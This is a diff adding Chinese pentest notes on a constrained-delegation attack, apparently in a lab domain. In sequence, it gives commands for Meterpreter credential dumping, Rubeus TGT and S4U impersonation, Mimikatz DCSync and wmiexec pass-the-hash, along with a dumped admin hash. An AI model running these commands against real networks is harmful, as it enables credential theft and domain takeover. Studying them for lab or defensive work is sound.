@@ -148,6 +148,31 @@ proxychains crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb4
 [1](https://mp.weixin.qq.com/s/O2LC0Qk55AAOqLGTJmzISg)
 [2](https://zhuanlan.zhihu.com/p/581577873)
 
+```bash
+meterpreter > load kiwi
+meterpreter > creds_all
+```
+约束委派攻击
+* 1. 通过Rubeus申请机器账户MSSQLSERVER的TGT
+
+```bash
+Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:<NTLM> /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap
+```
+* 2. 然后使用 S4U2Self 扩展代表域管理员 Administrator 请求针对域控 LDAP 服务的票据，并将得到的票据传递到内存中
+```bash
+Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:LDAP/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:doIFmjC....==
+```
+* 3. LDAP 服务具有DCSync权限，导出域内用户的Hash
+```bash
+mimikatz.exe "lsadump::dcsync /domain:xiaorang.lab /user:Administrator" exit
+    kiwi_cmd "lsadump::dcsync /domain:xiaorang.lab /user:Administrator" exit
+# 获得域管理员哈希 1a19251fbd935969832616366ae3fe62
+```
+* 4. WMI横向 登录域控
+```
+python wmiexec.py -hashes 00000000000000000000000000000000:1a19251fbd935969832616366ae3fe62 Administrator@172.22.2.3
+```
+
 # Article
 
 [域内定位个人PC的三种方式](https://mp.weixin.qq.com/s/uXTo2AbmvMeNesR8rAjImw)
